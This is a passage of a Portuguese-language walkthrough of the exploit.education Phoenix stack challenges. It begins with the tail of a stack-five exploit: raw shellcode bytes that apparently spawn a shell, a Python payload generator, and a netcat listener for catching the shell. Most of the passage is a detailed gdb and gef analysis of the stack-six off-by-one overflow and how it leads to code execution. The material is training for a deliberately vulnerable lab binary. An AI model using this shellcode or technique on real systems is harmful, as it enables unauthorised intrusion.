buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<ul>
<li><a href="print.html#-dicas">ğŸ’¡ Dicas</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">ğŸ›¸ ExplicaÃ§Ã£o</a>
<ul>
<li><a href="print.html#analisando-o-programa">Analisando o programa</a>
<ul>
<li><a href="print.html#main">main</a>
<ul>
<li><a href="print.html#dica">Dica</a></li>
</ul>
</li>
<li><a href="print.html#greet">greet</a></li>
</ul>
</li>
<li><a href="print.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
<ul>
<li><a href="print.html#main-1">main</a></li>
</ul>
</li>
<li><a href="print.html#fuzz">Fuzz</a></li>
<li><a href="print.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
<ul>
<li><a href="print.html#curiosidade">Curiosidade</a></li>
</ul>
</li>
<li><a href="print.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execuÃ§Ã£o de cÃ³digo</a>
<ul>
<li><a href="print.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-exploit">ğŸ”¥ Exploit</a>
<ul>
<li><a href="print.html#o-que-controlamos">O que controlamos?</a>
<ul>
<li><a href="print.html#setup">Setup</a></li>
<li><a href="print.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
<li><a href="print.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que regiÃ£o podemos apontar rbp</a></li>
<li><a href="print.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa regiÃ£o que aponte para a parte que controlamos</a></li>
</ul>
</li>
<li><a href="print.html#shellcode">Shellcode</a></li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ’« SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-dicas-2" id="-dicas-2"><h1>ğŸ’¡ Dicas</h1></a>
<p>Off-by-one BOF</p>
<a class="header" href="print.html#-explicaÃ§Ã£o-4" id="-explicaÃ§Ã£o-4"><h1>ğŸ›¸ ExplicaÃ§Ã£o</h1></a>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome Ã© usado para gerar uma mensagem de boas vindas! \
Esse processo de gerar as mensagens Ã© vulnerÃ¡vel a buffer overflow!</p>
<a class="header" href="print.html#analisando-o-programa-1" id="analisando-o-programa-1"><h2>Analisando o programa</h2></a>
<a class="header" href="print.html#main" id="main"><h3>main</h3></a>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main comeÃ§a definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verificaÃ§Ãµes relacionadas Ã  arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
<p>Isso Ã© usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos nÃ£o a encontramos no cÃ³digo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binÃ¡rio:
<img src="./img/stack_six/Messages_ARCH.png" alt="DiferenÃ§a entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, Ã© checado se ptr Ã© NULL (a env var nÃ£o existe)</p>
<p>Caso nÃ£o exista: usa a funÃ§Ã£o errx() para interromper a execuÃ§Ã£o com uma mensagem de erro! errx() recebe 2 argumento: (cÃ³digo_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // CÃ³digo de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o cÃ³digo retornado pelo ultimo programa
<img src="./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> Ã© chamada, e o valor retornado por ela Ã© printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<a class="header" href="print.html#dica" id="dica"><h4>Dica</h4></a>
<p>Para definir uma env var no gdb</p>
<p><img src="./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<a class="header" href="print.html#greet" id="greet"><h3>greet</h3></a>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir terminaÃ§Ã£o com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulnerÃ¡vel! D:</p>
<p>A funÃ§Ã£o <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>SÃ£o definidas duas variÃ¡veis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho mÃ¡ximo)</p>
<p>O tamanho de <code>who</code> Ã© salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers sÃ£o terminados com um NULL byte, portanto um buffer[128] sÃ³ armazena 127 letras!</p>
</blockquote>
<p>Em seguida, Ã© checado se <code>maxSize</code> Ã© maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize Ã© 127</p>
</blockquote>
<p>Essa Ã© uma tentativa de prevenir o buffer overflow! Pois, sÃ³ seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem nÃ£o leva em consideraÃ§Ã£o o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>EntÃ£o nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do cÃ³digo que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (vocÃª passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho!
Caso nos conseguÃ­ssemos controlar what, poderÃ­amos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) Ã© similar a <code>strcpy</code>, mas recebe um terceiro parÃ¢metro: tamanho!</p>
<p>Esse tamanho Ã© limitado Ã  127 (limite de <code>maxSize</code>), entÃ£o teoricamente nÃ£o seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio Ã© 34 bytes (na versÃ£o amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>EntÃ£o se nÃ£o fosse pelo inicio da mensagem, nÃ£o seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<a class="header" href="print.html#analisando-o-programa-asm" id="analisando-o-programa-asm"><h2>Analisando o programa (ASM)</h2></a>
<a class="header" href="print.html#main-1" id="main-1"><h3>main</h3></a>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1Âº argumento Ã© &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; tambÃ©m deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a comparaÃ§Ã£o anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos nÃ£o emitimos erro

Essa parte sÃ³ executa caso ExploitEducation nÃ£o exista {
        mov    esi,0x4008d8               ; 2Âº argumento
        mov    edi,0x1                    ; 1Âº argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execuÃ§Ã£o e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1Âº argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1Âº argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>NÃ£o Ã© tÃ£o relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o cÃ³digo fonte!</p>
<p>Mas caso queira, vocÃª pode analisar por conta prÃ³pria e relacionar o ASM com o cÃ³digo fonte por treino :D</p>
<a class="header" href="print.html#fuzz-1" id="fuzz-1"><h2>Fuzz</h2></a>
<p>Agora que sabemos que Ã© possÃ­vel realizar o overflow, vamos ver o que Ã© corrompido :D</p>
<p>Nos sÃ³ podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: entÃ£o <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<a class="header" href="print.html#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as"><h2>E vamos rodar com 127 As:</h2></a>
<p>Obs:</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas nÃ£o funciona sei la por que :(</p>
<p>EntÃ£o eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!!</p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endereÃ§o de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endereÃ§o: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg Ã© sÃ³ para a formataÃ§Ã£o ficar legÃ­vel! Significa e<strong>X</strong>tra <strong>G</strong>rande (que Ã© o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack sÃ£o: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execuÃ§Ã£o <code>c</code>, e ver se eles se alteram (lembrando greet Ã© vulnerÃ¡vel)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que nÃ³s conseguimos controlar o Ãºltimos byte do rbp salvo! Esse ultimo byte constuma ser
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow Ã© um <code>BoF</code> que corrompe o <code>LSB</code>, ou como Ã© mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow Ã© bem comum: vÃ£o esquecer de que o buffer termina com um <code>0x00</code> e vÃ£o comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<a class="header" href="print.html#curiosidade" id="curiosidade"><h4>Curiosidade</h4></a>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as variÃ¡veis em uma posiÃ§Ã£o,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> nÃ£o vai ser exploitavel, pois o byte que vem logo depois do buffer nÃ£o necessariamente Ã© o rbp!
E esse Ã© o nosso caso: existem outras variÃ¡veis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaÃ§o!</p>
<p>Caso a mensagem fosse 1 byte maior, poderÃ­amos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, nÃ£o conseguirÃ­amos controlar o rbp!</p>
<p>E caso a mensagem fosse 4 bytes a mais, como vocÃª pode imaginar, poderÃ­amos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! Ã‰ o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que vÃ¡ nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execuÃ§Ã£o de cÃ³digo</strong></p>
<p>Na vida real, caso nÃ£o existisse essa mensagem, sÃ³ conseguirÃ­amos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp,
isto Ã©: nÃ£o existe nenhuma outra variÃ¡vel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, nÃ³s nao conseguirÃ­amos alterar RBP nem RIP,
portanto seria impossÃ­vel conseguir execuÃ§Ã£o de cÃ³digo :(

O mÃ¡ximo que conseguimos fazer Ã© corromper 1 byte de uma variÃ¡vel!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variÃ¡veis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: nÃ£o acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela variÃ¡vel poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<a class="header" href="print.html#como-ir-de-off-by-one-para-execuÃ§Ã£o-de-cÃ³digo" id="como-ir-de-off-by-one-para-execuÃ§Ã£o-de-cÃ³digo"><h2>Como ir de off-by-one para execuÃ§Ã£o de cÃ³digo</h2></a>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>EntÃ£o esse rbp que estamos alterando Ã© o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execuÃ§Ã£o normalmente, na sua ultima instruÃ§Ã£o (<code>ret</code>) a magica acontece</p>
<a class="header" href="print.html#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido"><h3>Ret com um RBP corrompido</h3></a>
<p>resumindo, ret Ã© um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, entÃ£o +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para cÃ³digo que controlamos, e apontar rbp para esse endereÃ§o <strong>-</strong> 8 :D</p>
<p>EntÃ£o caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>!
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execuÃ§Ã£o :D</p>
<a class="header" href="print.html#-exploit-3" id="-exploit-3"><h1>ğŸ”¥ Exploit</h1></a>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que regiÃ£o podemos apontar rbp</li>
<li>Encontrar um pointer nessa regiÃ£o que aponte para a parte que controlamos</li>
</ol>
<a class="header" href="print.html#o-que-controlamos" id="o-que-controlamos"><h2>O que controlamos?</h2></a>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input Ã© passado pelas env vars... portanto podemos falar que a unica regiÃ£o da memoria que
controlamos sÃ£o as env vars</p>
<p>E qual Ã© essa regiÃ£o? Vamos encontrar :D</p>
<a class="header" href="print.html#setup" id="setup"><h3>Setup</h3></a>
<p>As envs sÃ£o diferentes dentro do gdb, nÃ³s podemos comparar usando</p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferenÃ§a Ã©: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferenÃ§a, e garantir que todos endereÃ§os estÃ£o certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se vocÃª sair do gdb elas vÃ£o resetar!
</code></pre>
<a class="header" href="print.html#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos"><h3>Descobrir que partes da memoria controlamos</h3></a>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endereÃ§o e printando!</p>
<p><img src="./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente Ã© o inicio das envs, no nosso caso Ã© :D</p>
</blockquote>
<p><img src="./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs estÃ£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<a class="header" href="print.html#encontrar-para-que-regiÃ£o-podemos-apontar-rbp" id="encontrar-para-que-regiÃ£o-podemos-apontar-rbp"><h3>Encontrar para que regiÃ£o podemos apontar rbp</h3></a>
<p>Nesse caso Ã© fÃ¡cil ne? Se nÃ³s sÃ³ podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<a class="header" href="print.html#encontrar-um-pointer-nessa-regiÃ£o-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-regiÃ£o-que-aponte-para-a-parte-que-controlamos"><h3>Encontrar um pointer nessa regiÃ£o que aponte para a parte que controlamos</h3></a>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a regiÃ£o da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela regiÃ£o da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword sÃ£o 8 bytes, assim, 32 qwords sÃ£o 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa regiÃ£o</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endereÃ§os, precisamos encontrar um que tenha um <strong>pointer que aponte para a regiÃ£o da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endereÃ§os da regiÃ£o que controlamos comeÃ§am com <code>0x7fffffff</code>, entÃ£o esse ja Ã© um bom comeÃ§o</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500â”‚+0x0000 0x0000000000000001
0x00007fffffffe508â”‚+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510â”‚+0x0010 0x00007ffff7ffc948
0x00007fffffffe518â”‚+0x0018 0x00000000000000a6
0x00007fffffffe520â”‚+0x0020 0x00007fffffffe57f
0x00007fffffffe528â”‚+0x0028 0x0000000000000001
0x00007fffffffe530â”‚+0x0030 0x4141414141414141
0x00007fffffffe538â”‚+0x0038 0x00007ffff7ffb300
0x00007fffffffe540â”‚+0x0040 0x0000000000000000
0x00007fffffffe548â”‚+0x0048 0x0000000000600c00
0x00007fffffffe550â”‚+0x0050 0x000000000040079b
0x00007fffffffe558â”‚+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda nÃ£o o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e nÃ£o no endereÃ§o</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos sÃ³ levando os valores em consideraÃ§Ã£o! Para facilitar, tambÃ©m podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs estÃ£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O Ãºnico valor valido Ã© <strong>0x00007fffffffef10</strong>, pois todos os outros sÃ£o menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endereÃ§o desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8â”‚+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos nÃ£o queremos esse endereÃ§o no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma funÃ§Ã£o retorna, o endereÃ§o 8 bytes maior que rbp, Ã© onde o rip esta! EntÃ£o por definir <code>rbp = 0x00007fffffffe5c0</code>, nos
estamos definindo <code>rip = 0x00007fffffffe5c8</code> entÃ£o nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E vocÃª talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! EntÃ£o nÃ£o precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se vocÃª quer continuar sozinhx, agora Ã© sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow Ã©: c0
Eu recomendo vc tentar encontrar ele por conta prÃ³pria pois
pode variar de acordo com o seu computador (explicaÃ§Ã£o em breve) :D
.
.
.
.
.
.
.
</code></pre>
<a class="header" href="print.html#shellcode-1" id="shellcode-1"><h2>Shellcode</h2></a>
<p>EntÃ£o o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ï¿½AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½ï¿½
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela</p>
<p>Isso quer dizer que conseguimos execuÃ§Ã£o de cÃ³digo! lembrando que isso Ã© muito frÃ¡gil: uma alteraÃ§Ã£o nas envs e o exploit quebra!</p>
<p>Nos podemos usar tÃ©cnicas como encontrar um pointer que esta numa localizaÃ§Ã£o fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em sÃ³ fazer ele funcionar! Caso vc queira, pode aplicar as tÃ©cnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
